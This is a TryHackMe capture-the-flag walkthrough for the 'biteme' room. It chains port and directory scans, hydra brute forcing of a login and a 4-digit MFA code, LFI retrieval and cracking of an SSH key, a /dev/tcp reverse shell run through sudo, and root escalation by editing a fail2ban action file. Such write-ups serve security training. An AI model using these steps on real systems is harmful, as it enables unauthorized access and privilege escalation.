# biteme

**Room Link:** [https://tryhackme.com/room/biteme](https://tryhackme.com/room/biteme)

## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (748).png" alt=""><figcaption></figcaption></figure>

## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (749).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```



<figure><img src="../../.gitbook/assets/image (753).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (752).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (750).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (751).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
gobuster dir -u http://$VICTIM/console -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x phps
```

<figure><img src="../../.gitbook/assets/image (754).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (755).png" alt=""><figcaption></figcaption></figure>

## **Finding username**

**Kali**

```
echo 6a61736f6e5f746573745f6163636f756e74 | xxd -r -p
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Recreating login

I merged configs.phps,  functions.php and index.phps into a index.php file. Made some modifications so that it could run  when hosted locally without the mfa part of the code so then I can try to bruteforce the credentials.

**index.php**

```
 <?php
session_start();
$showError = false;
define('LOGIN_USER', '6a61736f6e5f746573745f6163636f756e74'); 

function is_valid_user($user) {
    $user = bin2hex($user);
    return $user === LOGIN_USER;
}
// @fred let's talk about ways to make this more secure but still flexible
function is_valid_pwd($pwd) {
    $hash = md5($pwd);
    return substr($hash, -3) === '001';
} 


if (isset($_POST['user']) && isset($_POST['pwd'])) {
        if (is_valid_user($_POST['user']) && is_valid_pwd($_POST['pwd'])) {
            setcookie('user', $_POST['user'], 0, '/');
            setcookie('pwd', $_POST['pwd'], 0, '/');
            header('Location: mfa.php');
            exit();
        } else {
            $showError = true;
        }
  }  
?>

<!doctype html>
<html lang="en">
 <body class="text-center">
    <form action="index.php" method="post" class="form-signin" >
        <h1 class="h3 mb-3 font-weight-normal">Please sign in</h1>
        <input type="text" name="user" class="form-control" placeholder="Username" required>
        <input type="password" name="pwd" class="form-control" placeholder="Password" required>
        <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
        <?php if ($showError): ?><p class="mt-3 mb-3 text-danger">Incorrect details</p><?php endif ?>
    </form>
  </body>
</html>

```

**Kali**

```
echo MFA > mfa.php
php -S 127.0.0.1:81
```

<figure><img src="../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

## Bruteforce

**Kali**

```
hydra -l jason_test_account -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 81 http-post-form "/index.php:user=^USER^&pwd=^PASS^:F=Incorrect details"
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



**Browser**

```
Username: jason_test_account
Password: violet
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
python -c "with open('output.txt', 'w') as file: [file.write(f'{str(i).zfill(4)}\n') for i in range(10000)]"
```

**Kali**

```
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra/
./configure
make
make install
cd ..

thc-hydra/hydra -l jason_test_account -P output.txt $VICTIM http-post-form "/console/mfa.php:code=^PASS^:H=Cookie: PHPSESSID=hshqcs3n42r9qjs5b2850r9alt; user=jason_test_account; pwd=violet:F=Incorrect code" -T 64
```



<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (758).png" alt=""><figcaption></figcaption></figure>

## LFI

<figure><img src="../../.gitbook/assets/image (759).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
chmod 600
/opt/john/ssh2john.py id_rsa > id_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt id_john.txt 
```

<figure><img src="../../.gitbook/assets/image (760).png" alt=""><figcaption></figcaption></figure>

## TCP/22 - SSH

**Kali**

```
ssh -i id_rsa jason@$VICTIM 
Password: 1a2b3c4d
```

<figure><img src="../../.gitbook/assets/image (761).png" alt=""><figcaption></figcaption></figure>



## Lateral Movement

**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (762).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
echo '#!/bin/bash' > shell.sh
echo 'sh -i >& /dev/tcp/$KALI/1337 0>&1' >> shell.sh
```

**Kali**

```
nc -lvnp 1338
```

**Victim**

```
sudo -u fred ./shell.sh
```

<figure><img src="../../.gitbook/assets/image (763).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

## Privilege Escalation&#x20;

**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (764).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cat /etc/fail2ban/jail.conf
```

<figure><img src="../../.gitbook/assets/image (768).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
ls -la /etc/fail2ban/action.d/iptables-multiport.conf
vi /etc/fail2ban/action.d/iptables-multiport.conf
```

<figure><img src="../../.gitbook/assets/image (765).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (770).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
sudo /bin/systemctl restart fail2ban
```

Now we need to enter bad passwords until we've triggerd the ban action

**Kali**

```
ssh root@$VICTIM
```

<figure><img src="../../.gitbook/assets/image (769).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
/bin/bash -p
whoami
```

<figure><img src="../../.gitbook/assets/image (771).png" alt=""><figcaption></figcaption></figure>

